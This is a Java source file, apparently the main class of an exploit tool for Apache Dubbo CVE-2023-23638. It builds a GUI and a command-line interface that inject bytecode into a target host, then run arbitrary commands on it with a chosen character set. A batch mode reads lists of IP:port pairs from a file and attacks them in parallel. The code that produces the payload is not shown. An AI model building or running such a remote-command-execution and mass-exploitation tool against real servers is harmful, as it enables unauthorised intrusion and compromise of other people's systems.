package gui;

import exploit.InsertCode;
import exploit.ExecuteCmd;

import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.*;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class MainFrame extends JFrame {
    private JPanel panel;
    private JTabbedPane tabbedPane;
    private JPanel injectPanel;
    private JPanel executePanel;
    private JTextField ipField;
    private JTextField portField;
    private JComboBox<String> comboBox;
    private JTextArea injectTextArea;
    private JTextArea executeTextArea;
    private InsertCode expHandler;

    public MainFrame() {
        setTitle("Dubbo CVE-2023-23638 利用工具");
        setSize(700, 700);
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setLocationRelativeTo(null);

        panel = new JPanel(new BorderLayout());
        tabbedPane = new JTabbedPane();

        injectPanel = new JPanel(new BorderLayout());
        JPanel injectTopPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
        JLabel ipLabel = new JLabel("IP:");
        ipField = new JTextField(10);


        JLabel portLabel = new JLabel("Port:");
        portField = new JTextField(5);
        JButton exp = new JButton("执行");
        injectTopPanel.add(ipLabel);
        injectTopPanel.add(ipField);
        injectTopPanel.add(portLabel);
        injectTopPanel.add(portField);
        injectTopPanel.add(exp);
        injectPanel.add(injectTopPanel, BorderLayout.NORTH);
        injectTextArea = new JTextArea();
        injectPanel.add(new JScrollPane(injectTextArea), BorderLayout.CENTER);

        exp.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                expHandler =  new InsertCode(ipField.getText(),Integer.parseInt(portField.getText()),injectTextArea);
                expHandler.exploit();
                injectTextArea.append("\n执行完成！");
                tabbedPane.addTab("Execute Command", executePanel);

            }
        });

        executePanel = new JPanel(new BorderLayout());
        JPanel executeTopPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
        JLabel commandLabel = new JLabel("Command:");
        JTextField commandField = new JTextField(20);
        JButton executeButton = new JButton("Execute");
        String[] charsets = {"UTF-8", "GBK"};
        comboBox = new JComboBox<>(charsets);
        executeTopPanel.add(commandLabel);
        executeTopPanel.add(commandField);
        executeTopPanel.add(executeButton);
        executeTopPanel.add(comboBox);
        executePanel.add(executeTopPanel, BorderLayout.NORTH);
        executeTextArea = new JTextArea();
        executePanel.add(new JScrollPane(executeTextArea), BorderLayout.CENTER);

        executeButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                ExecuteCmd.exec(commandField.getText(),executeTextArea,comboBox.getSelectedItem().toString(),expHandler.getFullUrl());
            }
        });
        tabbedPane.addTab("Inject Bytecode", injectPanel);
        panel.add(tabbedPane, BorderLayout.CENTER);
        add(panel);

        setVisible(true);
    }

    public static void main(String[] args) {
        if (args.length == 0) {
            Font f = new Font("Arial", Font.PLAIN, 18);
            String names[] = {"Label", "TextField", "TabbedPane", "TextArea"};
            for (String item : names) {
                UIManager.put(item + ".font", f);
            }
            UIManager.put("TextArea.font", new Font(null, Font.PLAIN, 18));// 避免中文乱码
            new MainFrame();
        }else {
            if (args[0].equals("-h")){
                System.out.println("usage:\n\tjava -jar CVE-2023-23638.jar TARGET_IP TARGET_PORT COMMAND CHARSET(default UTF-8)\n\tjava -jar CVE-2023-23638.jar -s TARGET_IP TARGET_PORT\n\tjava -jar CVE-2023-23638.jar -f FILE_PATH");
            } else if (args[0].equals("-s")) {
                InsertCode insertCode = new InsertCode(args[1], Integer.parseInt(args[2]), null);
                insertCode.scan();
            } else if (args[0].equals("-f")) {
                int count = 0;
                ExecutorService executor = Executors.newCachedThreadPool();
                try (BufferedReader br = new BufferedReader(new FileReader(args[1]))) {
                    String line;
                    while ((line = br.readLine()) != null) {
                        try {
                            String[] ipAndPort = line.split(":");
                            InsertCode insertCode = new InsertCode(ipAndPort[0], Integer.parseInt(ipAndPort[1]),null);
                            count+=1;
                            executor.submit(insertCode);
                        }catch (Exception e){
                            System.out.println("line:"+line+"错误");
                        }
                    }
                    executor.shutdown();
                    try {
                        boolean terminated = executor.awaitTermination(count*30, TimeUnit.SECONDS);
                        if (!terminated) {
                            System.out.println("[-]存在超时任务");
                        }
                    } catch (InterruptedException e) {

                    }
                } catch (IOException|IndexOutOfBoundsException e) {
                    System.out.println("参数错误");
                }
            }else{
                String charset = "utf-8";
                InsertCode insertCode = new InsertCode(args[0], Integer.parseInt(args[1]),null);
                insertCode.exploit();
                System.out.println("加载字节码成功");
                if (args.length == 4 && !args[3].equals("utf-8")){
                    charset = args[3];
                }
                ExecuteCmd.exec(args[2],null,charset,insertCode.getFullUrl());
            }
        }
    }
}
